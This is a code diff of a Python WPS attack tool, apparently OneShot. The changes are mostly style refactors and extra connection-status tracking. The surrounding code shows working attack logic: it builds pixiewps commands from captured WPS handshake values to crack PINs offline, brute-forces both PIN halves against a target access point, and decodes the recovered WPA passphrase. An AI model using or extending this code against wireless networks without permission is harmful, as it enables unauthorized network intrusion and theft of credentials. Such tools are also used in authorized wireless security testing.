@@ -14,6 +14,7 @@ from datetime import datetime
 import collections
 import statistics
 
+
 class WPSException(Exception):
     pass
 
@@ -245,7 +246,7 @@ def get_hex(line):
     return a[2].replace(' ', '').upper()
 
 
-class PixiewpsData():
+class PixiewpsData(object):
     def __init__(self):
         self.pke = ''
         self.pkr = ''
@@ -258,17 +259,20 @@ class PixiewpsData():
         self.__init__()
 
     def got_all(self):
-        return self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2
+        return (self.pke and self.pkr and self.e_nonce and self.authkey
+                and self.e_hash1 and self.e_hash2)
 
     def get_pixie_cmd(self, full_range=False):
-        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
-            self.pke, self.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
+        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}\
+                    --e-hash2 {} --authkey {} --e-nonce {}".format(
+                    self.pke, self.pkr, self.e_hash1,
+                    self.e_hash2, self.authkey, self.e_nonce)
         if full_range:
             pixiecmd += ' --force'
         return pixiecmd
 
 
-class ConnectionStatus():
+class ConnectionStatus(object):
     def __init__(self):
         self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
         self.last_m_message = 0
@@ -282,7 +286,7 @@ class ConnectionStatus():
         self.__init__()
 
 
-class BruteforceStatus():
+class BruteforceStatus(object):
     def __init__(self):
         self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         self.mask = ''
@@ -298,7 +302,8 @@ class BruteforceStatus():
             percentage = int(self.mask) / 11000 * 100
         else:
             percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
-        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(percentage, self.start_time, average_pin_time))
+        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
+            percentage, self.start_time, average_pin_time))
 
     def registerAttempt(self, mask):
         self.mask = mask
@@ -315,7 +320,7 @@ class BruteforceStatus():
 
 
 class Companion(object):
-    """docstring for Companion"""
+    """Main application part"""
     def __init__(self, interface, save_result=False, print_debug=False):
         self.interface = interface
         self.save_result = save_result
@@ -422,19 +427,22 @@ class Companion(object):
                 self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8')
         elif ': State: ' in line:
             if '-> SCANNING' in line:
+                self.connection_status.status = 'scanning'
                 print('[*] Scanning…')
-        elif 'WPS-FAIL' in line:
+        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             self.connection_status.status = 'WPS_FAIL'
             print('[-] wpa_supplicant returned WPS-FAIL')
 #        elif 'NL80211_CMD_DEL_STATION' in line:
 #            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
         elif 'Trying to authenticate with' in line:
+            self.connection_status.status = 'authenticating'
             if 'SSID' in line:
                 self.connection_status.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8')
             print('[*] Authenticating…')
         elif 'Authentication response' in line:
             print('[+] Authenticated')
         elif 'Trying to associate with' in line:
+            self.connection_status.status = 'associating'
             if 'SSID' in line:
                 self.connection_status.essid = codecs.decode(line.split("'")[1], 'unicode-escape').encode('latin1').decode('utf-8')
             print('[*] Associating with AP…')
@@ -445,6 +453,7 @@ class Companion(object):
             else:
                 print('[+] Associated with {}'.format(bssid))
         elif 'EAPOL: txStart' in line:
+            self.connection_status.status = 'eapol_start'
             print('[*] Sending EAPOL Start…')
         elif 'EAP entering state IDENTITY' in line:
             print('[*] Received Identity Request')
@@ -458,7 +467,8 @@ class Companion(object):
         if showcmd:
             print(cmd)
         print("[*] Running Pixiewps…")
-        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=sys.stdout, encoding='utf-8')
+        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                           stderr=sys.stdout, encoding='utf-8')
         print(r.stdout)
         if r.returncode == 0:
             lines = r.stdout.splitlines()
@@ -544,7 +554,7 @@ class Companion(object):
         self.sendOnly('WPS_CANCEL')
         return False
 
-    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False, pixieforce=False, raise_kbrdinterr=False):
+    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False, pixieforce=False):
         if not pin:
             if pixiemode:
                 pin = self.generator.getLikely(bssid) or '12345670'
@@ -576,7 +586,7 @@ class Companion(object):
         while int(f_half) < 10000:
             t = int(f_half + '000')
             pin = '{}000{}'.format(f_half, checksum(t))
-            self.single_connection(bssid, pin, raise_kbrdinterr=True)
+            self.single_connection(bssid, pin)
             if self.connection_status.isFirstHalfValid():
                 print('[+] First half found')
                 return f_half
@@ -599,7 +609,7 @@ class Companion(object):
         while int(s_half) < 1000:
             t = int(f_half + s_half)
             pin = '{}{}{}'.format(f_half, s_half, checksum(t))
-            self.single_connection(bssid, pin, raise_kbrdinterr=True)
+            self.single_connection(bssid, pin)
             if self.connection_status.last_m_message > 6:
                 return pin
             elif self.connection_status.status == 'WPS_FAIL':
@@ -940,7 +950,7 @@ if __name__ == '__main__':
     parser.add_argument(
         '--vuln-list',
         type=str,
-        default='vulnwsc.txt',
+        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
         help='Use custom file with vulnerable devices list'
         )
 
